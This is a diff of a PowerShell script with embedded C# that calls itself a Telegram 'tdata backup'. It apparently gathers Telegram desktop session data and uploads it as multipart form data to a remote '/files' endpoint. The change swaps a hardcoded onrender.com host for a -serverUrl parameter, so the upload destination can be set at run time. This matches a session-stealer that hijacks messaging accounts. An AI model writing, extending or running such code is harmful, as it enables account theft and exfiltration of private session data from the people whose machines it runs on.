@@ -1,3 +1,12 @@
+param (
+    [string]$serverUrl
+)
+
+if (-not $serverUrl) {
+    Write-Error "Error: You must provide a server URL using -serverUrl parameter."
+    exit 1
+}
+
 Add-Type -Language CSharp -ReferencedAssemblies "System.dll","System.Core.dll","System.IO.Compression.dll","System.IO.Compression.FileSystem.dll" -TypeDefinition @"
 using System;
 using System.Diagnostics;
@@ -9,10 +18,11 @@ using System.Threading;
 
 public class TelegramTdataBackup
 {
-    const string SERVER_URL = "https://xenv2-lb14.onrender.com";
+    private static string ServerUrl;
 
-    public static void BackupAndSend()
+    public static void BackupAndSend(string serverUrl)
     {
+        ServerUrl = serverUrl;
         ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
 
         string user = Environment.UserName;
@@ -95,7 +105,7 @@ public class TelegramTdataBackup
         if (!Path.IsPathRooted(filePath))
             filePath = Path.Combine(Directory.GetCurrentDirectory(), filePath);
 
-        string uri = SERVER_URL.TrimEnd(new char[] { '/' }) + "/files";
+        string uri = ServerUrl.TrimEnd(new char[] { '/' }) + "/files";
 
         string fileName = Path.GetFileName(filePath);
         string boundary = "----WebKitFormBoundary" + Guid.NewGuid().ToString("N");
@@ -141,4 +151,4 @@ public class TelegramTdataBackup
 }
 "@
 
-[TelegramTdataBackup]::BackupAndSend()
+[TelegramTdataBackup]::BackupAndSend($serverUrl)
